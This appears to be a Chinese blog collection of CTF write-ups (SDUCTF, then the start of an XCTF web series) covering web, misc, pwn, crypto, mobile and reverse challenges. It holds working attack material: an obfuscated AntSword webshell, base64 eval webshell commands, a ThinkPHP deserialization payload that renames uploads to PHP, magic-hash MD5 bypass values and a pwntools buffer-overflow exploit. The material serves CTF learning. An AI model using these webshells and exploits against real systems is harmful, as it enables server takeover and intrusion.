若要求满足上述条件则那么要求name和password数值不同但是MD5相同，在这里可以利用绕过。PHP在处理哈希字符串时，它把每一个以“0E”开头的哈希值都解释为0，所以如果两个不同的密码经过哈希以后，其哈希值都是以“0E”开头的，那么PHP将会认为他们相同，都是0。 以下值在md5加密后以0E开头： QNKCDZO 240610708 s878926199a s155964671a s214587387a s214587387a 以下值在sha1加密后以0E开头： sha1(‘aaroZmOk’) sha1(‘aaK1STfY’) sha1(‘aaO8zKZF’) sha1(‘aa3OFF9m’) 直接传入url/?a=QNKCDZO&amp;b=240610708，得到flag 0x12 php是最好的语言 题目描述： php是最好的语言? 进入页面如上图，点击查看source.php 1234567891011&lt;?php if ($_SERVER["REQUEST_METHOD"] == "POST") &#123; $flag="flag&#123;this_is_flag&#125;"; $pass=""; $thepassword_123="不告诉你"; extract($_POST);&#125;?&gt;&lt;div&gt; &lt;p&gt;&lt;?php if ($pass == $thepassword_123) &#123; echo $flag;&#125; else &#123;echo "ha,你永远猜不到";&#125; ?&gt;&lt;/p&gt;&lt;/div&gt; 得到php源码，百度php extract函数，得知extract()有个变量覆盖漏洞 由php源码得知所有变量名，直接出入post参数pass=&amp;thepassword_123= 得到flag 0x13 一句话木马2 题目描述： 在现实世界中，最原始的一句话木马往往会被waf给拦截，所以在使用过程中一般会进行编码或者加密。这里使用最简单的编码，你能成功利用这个后门吗？ 进入网页查看源码 百度得知waf是Web Application Firewall的简称。 这题应该是要绕过waf，进行获取webshell 由&lt;!--php @eval(@base64_decode($_POST[&quot;cmd&quot;])); --&gt;和题目shell.php得知：实在shell.php执行一句话木马 12345system(&apos;ls&apos;);base64&gt;&gt;&gt;c3lzdGVtKCdscycpOw==system(&apos;cat ffffllllaaaagggg&apos;)base64&gt;&gt;&gt;c3lzdGVtKCdjYXQgZmZmZmxsbGxhYWFhZ2dnZycpOw== 注：别在网页中解base64，不同网页也许会将字符串先url编码或者Unicode编码在进行base64加密，直接用burpsuite带的base64encode，然后发包即可 得知flag在同目录下的ffffllllaaaagggg里 得到flag 0x14 拼手速 题目描述： 你就是个没有感情的浏览器，但是你的手速够快吗？ 进入页面 如题，提交get请求url/?first=cyber 如题，提交post请求sceond=ans（因为计算式每次都会变，所以我这用ans替代，不过也没关系，得到如下页面 因为每次刷新get页面是计算式都会变，所以我想到了用python的requests的库，脚本如下 123456789101112131415161718192021222324252627282930313233import requestsimport reurl = "http://url/?first=cyber"reflag = '\d\*\d\+\d\*\d'def qa(): r1 = requests.get(url) print(r1.text) r2 = re.search(reflag,r1.text) print(r2.group()) ans = eval(r2.group()) print(ans) ck = str(r1.cookies) pd = re.search('PHPSESSID=.* for',ck) pd = pd.group().split(' for')[0] print(pd) header = &#123; "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "Cookie":pd, "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2", "Accept-Encoding": "gzip, deflate" &#125; data = &#123;"second":ans&#125; print(header) r4 =requests.post(url,headers=header,data=data) print(r4) print(r4.text)#flag return r4 aa = qa()#print(aa) 跑出来结果如下，得到flag 0x15 信息泄露 题目描述： 信息泄露了，快拿到它 猜是php+Git泄露，参考如下文章，访问http://url/.git/HEAD，果然下载了HEAD文件 文件里写着：ref: refs/heads/master，按如下文章提取了访问url/refs/heads/master，提取了master里的文件：985e6ce910e4cffa9957cf88fd9ac28c13654d6c https://www.jianshu.com/p/0ea09975169d https://www.cnblogs.com/xhds/p/10884647.html 然后发现GitHack一波就得到flag了emmmmmmmm 0x16 web图床 题目描述： 图床开发中，先放出来给你们玩一下 进入发现是一个登陆网页，想要注入却是登陆失败，那就注册一个试试 注册后登陆进去，是一个可以上传图片的网页，其他啥东西也没有，推测是用图片做一句话木马 1copy a.png/b+1.php t.png 但是发现上传上去之后返回的是就是图片，改后缀也无法访问其php文件 于是尝试了各种图片一句话木马的可能，比如截断，抓包改后缀，发现服务器只接受图片文件，而且无论是什么格式的图片会被改成png格式进行呈现，而且不能上传其他格式的文件。 其中中间网页貌似崩了一下，看到是ThinkPHP V5.1 ，百度搜其漏洞，发现也没法实现 其展示的后面解md5得到是172.2.0.2，想着内网地址也没得访问，后面跟着也是文件的MD5值12Index of /upload/fd40c7f4125a9b9ff1a4e75d293e3080/MD5(172.2.0.2) = fd40c7f4125a9b9ff1a4e75d293e3080 抓包看Cookie解析之后，想改Cookie其中的文件后缀也没用。 后面实在没思路了，就打算对网站进行一波路径扫描，结果发现了惊喜，有一个www.tar.gz，访问下载文件，发现就是php源码了。 不过我还没到能完全审计php源码的高度，我就将其中一部分的源码取用百度搜索，果然搜到了原题 https://www.freebuf.com/column/205789.html https://blog.csdn.net/qq_26406447/article/details/90671853 https://www.zhaoj.in/read-5873.html 通过PHP反序列化，得到cookie去使文件转化时，解析成php。 php发序列号程序如下，用生成的结果替换已有的Cookie即可 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354&lt;?phpnamespace app\web\controller;class Profile&#123; public $checker; public $filename_tmp; public $filename; public $upload_menu; public $ext; public $img; public $except; public function __get($name) &#123; return $this-&gt;except[$name]; &#125; public function __call($name, $arguments) &#123; if($this-&gt;&#123;$name&#125;)&#123; $this-&gt;&#123;$this-&gt;&#123;$name&#125;&#125;($arguments); &#125; &#125;&#125;class Register&#123; public $checker; public $registed; public function __destruct() &#123; if(!$this-&gt;registed)&#123; $this-&gt;checker-&gt;index(); &#125; &#125;&#125;$profile = new Profile();$profile-&gt;except = ['index' =&gt; 'img'];$profile-&gt;img = "upload_img";$profile-&gt;ext = "png";$profile-&gt;filename_tmp = "../public/upload/md5(user)/md5(filename).png";$profile-&gt;filename = "../public/upload/md5(user)/xxx.php";$register = new Register();$register-&gt;registed = false;$register-&gt;checker = $profile;echo urlencode(base64_encode(serialize($register))); 不过复现时也遇到了不少麻烦，通过以下代码构造payload然后去替代我们的Cookie，刷新后得到我们修改后缀的php图片马。 不过在用户已登录时改Cookie时没用，要等到退出账户到登陆界面时设置新建Cookie，再刷新得到如下界面说明成功了 此时，去访问url/upload/即可看到我们修改的php后缀的文件，同时在上传做php图片马时也遇到了问题 以下是中国蚁剑生成的免杀马，和png图片拼接在一起上传后发现无法解析 1234567891011121314151617181920&lt;?php class ISGM &#123; function MaRC() &#123; $XYUg = "\xf9" ^ "\x98"; $LaqL = "\x57" ^ "\x24"; $LXlg = "\xe0" ^ "\x93"; $kYoS = "\x7a" ^ "\x1f"; $zzTF = "\xaf" ^ "\xdd"; $hteZ = "\x9f" ^ "\xeb"; $DBlL =$XYUg.$LaqL.$LXlg.$kYoS.$zzTF.$hteZ; return $DBlL; &#125; function __destruct()&#123; $LlRV=$this-&gt;MaRC(); @$LlRV($this-&gt;So); &#125;&#125;$isgm = new ISGM();@$isgm-&gt;So = isset($_GET['id'])?base64_decode($_POST['pass']):$_POST['pass'];?&gt; 然后尝试自己写了一个，拼接在一起也没有躲开这个错误的厄运 查看图片马的源码发现如下： 可能是png文件尾和php头部拼接，导致一些转义问题，php失去头部&lt;?php导致解析php解析失败 然后尝试用jpg文件去做一个图片马、上传，果然成功了 然后用中国蚁剑连上服务器，在根目录下找到flag Misc0x01 Gif 题目描述： Gif你眼神够快吗？ 用StegSolve.jar 打开目标gif，即可逐帧查看，一共六帧，4帧都是flag需要自己拼接。 拼接完得到flagSDUCTF{Gif_is_very_interesting} 0x02 PDF 题目描述： pdf里面藏了啥？ 跟攻防世界的一题misc一样，随便找个网站将pdf转doc，然后把图片拖开flag就藏在下面。 或者用一些pdf编辑器也做的到。 0x03 今晚月色美吗 题目描述： 小王同学在路上走路，突然发现小朱同学发了一条朋友圈，配图是美美的月亮。于是小王同学心血来潮，掏出手机也拍了一张照片。你觉得月亮有什么奇怪的地方吗？ 用StegSolve查看，原以为是加密，，没想到是藏在不同色差层。 0x04 聋子听声音 题目描述： 我这边用的是Audacity，据说AU也可以查看，根据题目描述，音频应该不是隐写，而是藏在频谱图里 查看频谱图就可得flag 0x05 二进制 题目描述：看二进制你能看出个什么花样来？ 原本没有思路的，将文件扔进binwalk和foremost跑没跑出东西，用less，more没跑出来，最后自暴自弃用cat一试，flag就出来了，我还以为有什么隐写emmmmmmmmmm 结果是一堆0加上flag 另一种办法，用010editor打开，直接搜索flag，得到flag 0x06 奇怪的压缩文件 题目描述： eva说她给tom发了一张二维码，但是Tom接收文件后觉得不太对劲。 打开附件PIC.zip，发现里面有四个压缩文件，发现解压不了。扔binwalk跑一波发现是jpeg，直接改后缀得到jpg图片。 四个压缩文件分别是QRcode四等分，用画图把他们拼一起，获得一张完整的二维码，扫码得到flag。 0x07 zip 题目描述： 这是一个加密的压缩包，你能打开它吗？ 发现没有截图，就说下思路把，转手就去把图截了，显示一个password.zip伪加密，用ZipCenOp解开伪加密，看到里面还有一个压缩包 但是压缩包里面是一个图片文件，写着flag不在这 于是就把里面那个zip拖进010editor查看，发现是隐写一个压缩包，直接看到flag，复制提交就完了 0x08 猜拳 题目描述： 猜拳，你能赢过机器人吗？ 又是没有思路的pwn，上网搜索得知python有个pwn库可以计算随机数种子，既然是猜，我就自己找一波规律。 12robot: bsj sjb jbsI can win: jbs bsj sjb 找规律得知对面出拳是一个循环，自己手动解一波得到flag (竟然改成Misc了，果然不是一道pwn题) PWN0x01 Simple nc 题目描述： 你会使用nc命令吗? 可能是全球最简单的pwn题目 虽然pwn还没入门，不过这确实是最简单得pwn。 熟悉nc即netcat命令即可，netcat ctf.sec.sdunet.cn 38849直接连上通过ls,cat命令读取flag 0x02 StackOverflow 题目描述： 作为程序员怎么会不知道 https://stackoverflow.com/ 一道基本的栈溢出题目，但是中间的编码问题令人烦躁 用IDA逆向，看到主函数。 进入hello()函数可以看到如下：其中有get函数 根据ctf-wiki的pwn的基本教程的get栈溢出就可以做出来 还在其中找到success，这应该就是我们getshell的函数 根据ctf-wiki构造exp 1234567891011from pwn import *sh = remote("ctf.sec.sdunet.cn","38268")#sh = process(./stackoverflow)success_addr=0x08048486#payload = 'a' * 0x14 + 'bbbb' + p32(success_addr)payload = 'a' * 0x14 + 'bbbb' + '\x86\x84\x04\x08'print(p32(success_addr)#out&gt;&gt;&gt;b'\x86\x84\x04\x08'sh.sendline(payload)sh.interactive() 用pwntools直接构造exp，getshell，获得flag 其中遇到了一个编码问题： 因为地址用p32转成地址形式为b&#39;\x86\x84\x04\x08所以一直编码不成功，导致payload连接失败不能成功getshell 在decode时使用&#39;ignore&#39;模式，\x86\x84两个字符会被忽略，说明是非法字符。 不懂是啥错误！！ pwn自带的flat方法可以拼接字符串避开str连接的错误，flat方法传入一个列表list[]，list里放所需要拼接的对象 ： payload = flat([&#39;a&#39;*24,&#39;bbbb&#39;,addr]) 还有执行elf文件，由于我的系统是64bitUbuntu，执行32bitELF文件需要安装以下包 1sudo apt install lib32ncurses5 lib32z1 Crypto0x01 Base 题目描述：[https://baike.baidu.com/item/贝斯/] 奇怪的链接 题目直接给了两个链接，不过第二个如下 1ZmxhZ3tiYXNlNjRfaXNfbm90X2FuX2VuY3J5cHRpb25fbWV0aG9kfQ 直接扔base64去解码，得到flag：flag{base64_is_not_an_encryption_method} 0x02 诡异的数字 题目描述：摩同学做ctf到深夜，点开这道题却发现网安实验室里的灯突然有规律的时暗时亮，十分诡异。难道这代表着什么？他用颤抖的双手记下了下面这段文字。你能发现其中的奥秘吗？11 111 010 000 0 11111 00 000 1111100 10 1 0 010 0 000 1 00 10 110 flag格式为sductf{xxxxxxxxxx} 既然是摩同学，那么直接放莫斯解码即可，字符串利用python脚本的str.replae()方法替换成.-即可，即1对应-，2对应.，解得flag。 0x03 九宫格 题目描述：无论是搜狗输入法还是百度输入法还是QQ输入法还是讯飞输入法还是谷歌输入法还是……….都有9宫格，所以这个题目炒鸡简单 7426366432983解出来的明文赋值给x flag为 flag{ md5(x+md5(x,16), 32) }(结果没有空格，x+ 表示的是x与另一个字符串进行拼接） 一串数字通过经典的九宫格打出来是山东大学四个字 然后通过python的hashlib.md5()就可以算出flag md5的16位百度得知是截取32位md5中间的16位 1234import hashlibs = "山东大学"mobj = hashlib.md5(s.encode('utf-8')).hexdigest()[8:24]ans = hashlib.md5(str(s+mobj).encode('utf-8')).hexdigest() 12345678&gt;&gt;&gt; import hashlib&gt;&gt;&gt; s = "山东大学"&gt;&gt;&gt; mobj = hashlib.md5(s.encode('utf-8')).hexdigest()[8:24]&gt;&gt;&gt; mobj'f09383b061bb3c9f'&gt;&gt;&gt; ans = hashlib.md5(str(s+mobj).encode('utf-8')).hexdigest()&gt;&gt;&gt; ans'ecf506190946c4e8d06d53e14191329e' 0x04 键盘追踪 题目描述：键盘是个画板，如果你的键盘有灯光应该会简单点 rfsdsz tfvbhy ijnm ijnm tfvbhy wsxdcft vgyhujm hjuygbn 还原出明文后请自行拼接flag{} 之前在成都大学的ctf比赛中看过键盘密码，看题目描述应该是按键盘位置画出字母来，但是我比划出olloWMe后七个字母，硬是没看懂第一个字符是啥，然后将那些字符扔去百度，搜索得到的时FollowMe，尝试一波，果然是flag。 （至今为止我都不知道第一个为啥时F 0x05 宇宙终极问题 题目描述：Do you know The Answer to the Ultimate Question of Life, The Universe, and Everything? Give me 3 integers, x, y, and z, such that x^3 + y^3 + z^3 = 42 得到x、y、z后请把它们乘起来，然后包裹上flag{} 直接百度得到解如下，扔进python跑一波大数乘法 1234567&gt;&gt;&gt; x = -80538738812075974&gt;&gt;&gt; y = 80435758145817515&gt;&gt;&gt; z = 12602123297335631&gt;&gt;&gt; x**3+y**3+z**342&gt;&gt;&gt; x*y*z-81639006040518590050493906720365515701570561538910 0x06 秘密报文 题目描述：在第一次世界大战期间，法国陆军捕获到一份秘密报文，交给中尉Georges Painvin尝试破解。 报文内容如下：XX DF GG AF XD XF AF XD XF AF AG DD AF GF DX XF XD 解密之后请自行拼接flag{}提交 我记得之前做题时有看见过类似密码，但是忘了是啥。 最明显的，先把中尉名字Georges Painvin百度一波，得知时ADFGVX密码对照密码表，解得flag：flag{youarearealhacker} 0x07 ok? 题目描述： 就问你ok不ok Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook# Ook! Ook! Ook. Ook# Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook# Ook. Ook# Ook! Ook. Ook# Ook. Ook. Ook. Ook. Ook! Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook# Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook# Ook! Ook! Ook. Ook# Ook! Ook! Ook! Ook! Ook! Ook! Ook# Ook. Ook# Ook! Ook. Ook# Ook! Ook! Ook! Ook! Ook! Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook# Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook# Ook! Ook! Ook. Ook# Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook# Ook. Ook# Ook! Ook. Ook# Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook# Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook# Ook! Ook! Ook. Ook# Ook! Ook! Ook! Ook! Ook! Ook! Ook# Ook. Ook# Ook! Ook. Ook# Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook# Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook# Ook! Ook! Ook. Ook# Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook# Ook. Ook# Ook! Ook. Ook# Ook! Ook. Ook! Ook. Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook# Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook# Ook! Ook! Ook. Ook# Ook! Ook! Ook! Ook! Ook! Ook! Ook# Ook. Ook# Ook! Ook. Ook# Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook# Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook# Ook! Ook! Ook. Ook# Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook# Ook. Ook# Ook! Ook. Ook# Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook# Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook# Ook! Ook! Ook. Ook# Ook! Ook! Ook! Ook! Ook! Ook! Ook# Ook. Ook# Ook! Ook. Ook# Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook# Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook# Ook! Ook! Ook. Ook# Ook. Ook. Ook. Ook. Ook. Ook. Ook# Ook. Ook# Ook! Ook. Ook# Ook. Ook. Ook. Ook. Ook! Ook. Ook! Ook. Ook# Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook# Ook! Ook! Ook. Ook# Ook. Ook. Ook. Ook. Ook. Ook. Ook# Ook. Ook# Ook! Ook. Ook# Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook# Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook# Ook! Ook! Ook. Ook# Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook# Ook. Ook# Ook! Ook. Ook# Ook! Ook! Ook! Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook# Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook# Ook! Ook! Ook. Ook# Ook. Ook. Ook. Ook. Ook. Ook. Ook# Ook. Ook# Ook! Ook. Ook# Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook# Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook# Ook! Ook! Ook. Ook# Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook# Ook. Ook# Ook! Ook. Ook# Ook! Ook! Ook! Ook! Ook! Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook# Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook# Ook! Ook! Ook. Ook# Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook# Ook. Ook# Ook! Ook. Ook# Ook. Ook. Ook. Ook. Ook! Ook. Ook# Ook. 既然是密码题，那就百度呗 搜索的是ok密码，文章和转换的github地址如下 https://www.splitbrain.org/services/ook https://github.com/splitbrain/ook 不过有点不对，观察样例密码，把#换成?，解得flag 0x08 什么密码？ 题目描述： EVA给Tom发了一封邮件，但是Tom却看不懂EVA想表达什么，请你向Tom解释一下这封邮件 发件人：EVA收件人：TomPxevhfxmhietrpbmamablztfx flag格式：sductf{+.} The answer is related to my favorite movie. 密码可能做着做着心态崩了，不小心把Crypto当misc做了 把图片下下来，没注意到图片上到Cesar，binwalk跑一波图片，发下里面还有一个zlib，百度解zlib，然后疯狂报错，贼难受，然后看了hint，得知凯撒密码 难受 -600point 位移几位忘了。 And 十分真实，都把顺序放我TODO List下了，妈耶 什么密码？https://blog.csdn.net/qq_40574571/article/details/80164981 0x09 Mix 题目描述：解开她，flag就是你的了 JiN4MjU7JiN4MzM7JiN4MzY7JiN4MjU7JiN4MzM7JiN4MzY7JiN4MjU7JiN4MzM7JiN4MzY7JiN4MjU7JiN4MzY7JiN4MzM7JiN4MjU7JiN4MzM7JiN4MzY7JiN4MjU7JiN4MzM7JiN4MzE7JiN4MjU7JiN4MzM7JiN4MzY7JiN4MjU7JiN4MzM7JiN4Mzc7JiN4MjU7JiN4MzM7JiN4Mzc7JiN4MjU7JiN4MzY7JiN4MzI7JiN4MjU7JiN4MzM7JiN4MzY7JiN4MjU7JiN4MzY7JiN4MzQ7JiN4MjU7JiN4MzM7JiN4MzY7JiN4MjU7JiN4MzM7JiN4Mzk7JiN4MjU7JiN4MzM7JiN4Mzc7JiN4MjU7JiN4MzM7JiN4Mzg7JiN4MjU7JiN4MzM7JiN4MzU7JiN4MjU7JiN4MzY7JiN4MzY7JiN4MjU7JiN4MzM7JiN4MzY7JiN4MjU7JiN4MzY7JiN4MzQ7JiN4MjU7JiN4MzM7JiN4MzY7JiN4MjU7JiN4MzM7JiN4Mzk7JiN4MjU7JiN4MzM7JiN4Mzc7JiN4MjU7JiN4MzM7JiN4Mzg7JiN4MjU7JiN4MzM7JiN4MzU7JiN4MjU7JiN4MzY7JiN4MzY7JiN4MjU7JiN4MzM7JiN4MzY7JiN4MjU7JiN4MzM7JiN4MzM7JiN4MjU7JiN4MzM7JiN4Mzc7JiN4MjU7JiN4MzM7JiN4MzI7JiN4MjU7JiN4MzM7JiN4Mzc7JiN4MjU7JiN4MzM7JiN4Mzk7JiN4MjU7JiN4MzM7JiN4Mzc7JiN4MjU7JiN4MzM7JiN4MzA7JiN4MjU7JiN4MzM7JiN4Mzc7JiN4MjU7JiN4MzM7JiN4MzQ7JiN4MjU7JiN4MzM7JiN4MzY7JiN4MjU7JiN4MzY7JiN4MzY7JiN4MjU7JiN4MzM7JiN4Mzc7JiN4MjU7JiN4MzY7JiN4MzQ7 一看这种就是混合密码，靠直觉先解一波base64，然后发下可以解下去，发一波解密顺序，忘记录flag了。 1（base64-&gt;unicode-&gt;转中文（utf-8)-&gt;urldecode-&gt;hex decode） Mobile0x01 apk1 题目描述：用着安卓手机，你懂apk吗？ 通过工具d2j-dex2jar和jd-gui两者逆向apk得到flag 0x02 apk2 题目描述： 你真的懂apk吗？ 通过工具d2j-dex2jar和jd-gui两者逆向apk得到flag 然后看代码可知是对字符串进行一个排序，将字符串里的第i位放到s2[i]位，得到结果 直接写一个python脚本得到flag 0x03 apk3 题目描述：再来一发，听说过Kotlin吗？ 下下来解压按套路拖给d2j-dex2jar然后发现有两个.dex后缀的文件，逆向报错 于是现去网上下了一个jeb逆向，然后找一个样例现学jeb 直觉看这个字符串有用，然后在下面果然发现 play函数就是对这个字符串进行比对，就是将字符串的偶数位的ascii值减2，得到新串与该字符串进行比较 写个python脚本逆着加回去可得flag apk3：sductf{Easy_Apk_1s_n0t_hard_4_U!} 1234567891011&gt;&gt;&gt;f'a2P1W3Pmc0Tha3jfOX@rVzDzV22wbF7oWXHkVzPfTSD9'&gt;&gt;&gt; for i in f:... if cnt%2 == 0:... s += chr(ord(i)+2)... else:... s+=i... cnt += 1...&gt;&gt;&gt; s'c2R1Y3Rme0Vhc3lfQXBrXzFzX24wdF9oYXJkXzRfVSF9' 0x04 FuckAPP 题目描述： 你真的懂apk吗？ 常规，拖进jeb看main函数，发现只有一些setViewID之类的函数并没有主要的逻辑，于是回去将apk解压缩 发现包里和以前的apk解压不同，apk3是多了一个Kotlin文件夹，而这个fuck app 是多了一个lib文件夹，猜主要的函数在里面，打开lib/arm64-v8a得到一个libnative-lib.so，拖进IDA里进行逆向 暴力搜一波果然看到了flag，直接得到flag，还以为要看函数逻辑。 Reverse0x01 Java jar 题目描述： 都是java程序员，互相偷个代码谁不会呀！ 下载附件得到jar包，直接解压得到文件，打开main.class，看到flag明文就在main.class里 0x02 C 题目描述： C#简直跟java一样，会java就自然上手c#了。 下载附件得到sductf.exe，拖入辣个女人ida进行逆向，直接得到flag 0x03 Rust 题目描述： 你听说过Rust语言吗？ 据说它非常安全。 没接触过rust语言，不过据说逆向不知道程序逆向结构时，最好自己写个程序HelloWorld进行逆向一波看结构，但是我偷懒了。 直接百度搜索：rust逆向 https://www.anquanke.com/post/id/169970 https://blog.csdn.net/qq_33438733/article/details/81138573 看完链接之后打开ida，还需要64bit的辣个女人。 乱逛发现有一个字符串，但是解码出来是一个奇怪的东西，继续找主函数main 主函数入口 点进第一个函数查看流程 既然是逆向，那就从尾部往后面看，果然看到一个判断和一个类似flag的字符串c2R1Y3Rme0lfbDB2ZV9ydXN0X2hoaGh9，base64解码得到flag：sductf{I_l0ve_rust_hhhh} 0x04 EasyCrackMe 题目描述：无 下下来是一个exe文件，用010editor打开，发现说是PE文件，而且也发现是PE文件头，于是拖进去IDA逆向。 逆向main函数无思路，便开TextView查看，看到如下图黄色字符串感觉很奇怪，而且下面有一个Congratulations！，猜测这段字符串是flag F5进入查看具体函数，大概是对输入字符串的每一位与0x16进行异或得到v5字符串 于是用python逆函数一波，果然得到flag 在后面写wp时，完善了思路。 因为进去运行提示输入一个key，然后就在IDA的TextView搜索key，得到第一张图的函数入口，接下来看逻辑即可。]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[XCTF-adworld-web-wp]]></title>
    <url>%2F2019%2F11%2F11%2FXCTF-adworld-web-wp%2F</url>
    <content type="text"><![CDATA[Web&amp;WriteUpWeb如同一座正三角冰山，等着去探索。。。 攻防世界&amp;Web新手练习区0x01 view_source 题目描述：X老师让小宁同学查看一个网页的源代码，但小宁同学发现鼠标右键好像不管用了。 利用view-source://url或者f12或者右键查看源码，flag就在源码里 0x02 get_post 题目描述：X老师告诉小宁同学HTTP通常使用两种请求方法，你知道是哪两种吗？ 利用burp suite 发包得到flag 另一种思路是利用python的requests库发送请求。 0x03 robots 题目描述：X老师上课讲了Robots协议，小宁同学却上课打了瞌睡，赶紧来教教小宁Robots协议是什么吧。 查看源码肯定是没有flag的，根据题目robots可联想到web的robots.txt协议 robots.txt协议是在Web站点的根目录下设置一个robots.txt文件，规定站点上的哪些区域或者哪些页面是限制搜索的。搜索程序将参考该文件，决定站点中的哪些区域是不允许搜索的，并在接下来的搜索过程中跳过这些区域。 下面是一个例子： 123456&gt; #robots.txt for http://somehost.com&gt; &gt;User-agent: *&gt; Disallow: /cgi-bin&gt; Disallow: /registration&gt; 示例中第一行是一行注释，注释以一个#开头。 User-agent：指访问站点的程序，每个浏览器都有一个唯一的User-agent值，浏览器在向Web服务器发送请求时会在每个请求中都附加这个值。Web站点通过在robots.txt中使用User-agent就可以针对不同的User-agent设置不同的规则。 Disallow是拒绝语句，定义了搜索程序不允许访问的Web站点路径。拒绝语句只针对路径进行设置，不针对具体的文件。 直接访问http://xxx.xxx.xxx.xxx/robots.txt 得到一个php路径，直接访问得到flag 0x04 backup 题目描述：X老师忘记删除备份文件，他派小宁同学去把备份文件找出来,一起来帮小宁同学吧！ php的备份有两种：.php~和.php.bak 如果网站存在备份文件，在地址栏最末加上/index.php~或/index.php.bak，即可得到备份文件 index.php.bak 访问 http://url/index.php.bak 即自动下载了index.php.bak，打开查看flag就在里面 0x05 cookie 题目描述：X老师告诉小宁他在cookie里放了些东西，小宁疑惑地想：‘这是夹心饼干的意思吗？’ chrome在console中输入命令javascript:alert(document.cookie) 其实在地址栏输入也可以实现 弹出 look-here=cookie.php 访问url/cookie.php看到See the http response 打开F12开发者模式的Network，查看cookie.php的回应，Response里没找到flag，最后在Response Headers里找到flag 0x06 disabled button 题目描述：X老师今天上课讲了前端知识，然后给了大家一个不能按的按钮，小宁惊奇地发现这个按钮按不下去，到底怎么才能按下去呢？ 明显是一个灰色的按钮，查看源码有&lt;button disabled&gt;跟hackergame2019的签到题一样，把disabled删掉点击按钮即可。 0x07 simple_js 题目描述：小宁发现了一个网页，但却一直输不对密码。(Flag格式为 Cyberpeace{xxxxxxxxx} ) 先输入任意字符进入页面查看源码 12345678910111213141516171819202122&lt;script&gt; function dechiffre(pass_enc)&#123; var pass = "70,65,85,88,32,80,65,83,83,87,79,82,68,32,72,65,72,65"; var tab = pass_enc.split(','); var tab2 = pass.split(',');var i,j,k,l=0,m,n,o,p = "";i = 0;j = tab.length; k = j + (l) + (n=0); n = tab2.length; for(i = (o=0); i &lt; (k = j = n); i++ )&#123;o = tab[i-l];p += String.fromCharCode((o = tab2[i])); if(i == 5)break;&#125; for(i = (o=0); i &lt; (k = j = n); i++ )&#123; o = tab[i-l]; if(i &gt; 5 &amp;&amp; i &lt; k-1) p += String.fromCharCode((o = tab2[i])); &#125; p += String.fromCharCode(tab2[17]); pass = p;return pass; &#125; String["fromCharCode"](dechiffre("\x35\x35\x2c\x35\x36\x2c\x35\x34\x2c\x37\x39\x2c\x31\x31\x35\x2c\x36\x39\x2c\x31\x31\x34\x2c\x31\x31\x36\x2c\x31\x30\x37\x2c\x34\x39\x2c\x35\x30")); h = window.prompt('Enter password'); alert( dechiffre(h) );&lt;/script&gt; 看源码得知不论输入什么都会跳转至假密码然后失败，于是直接处理fromCharCode，得到flag 12345678910&gt;&gt;&gt; s = "\x35\x35\x2c\x35\x36\x2c\x35\x34\x2c\x37\x39\x2c\x31\x31\x35\x2c\x36\x39\x2c\x31\x31\x34\x2c\x31\x31\x36\x2c\x31\x30\x37\x2c\x34\x39\x2c\x35\x30"&gt;&gt;&gt; print(s)"55,56,54,79,115,69,114,116,107,49,50"&gt;&gt;&gt; a = 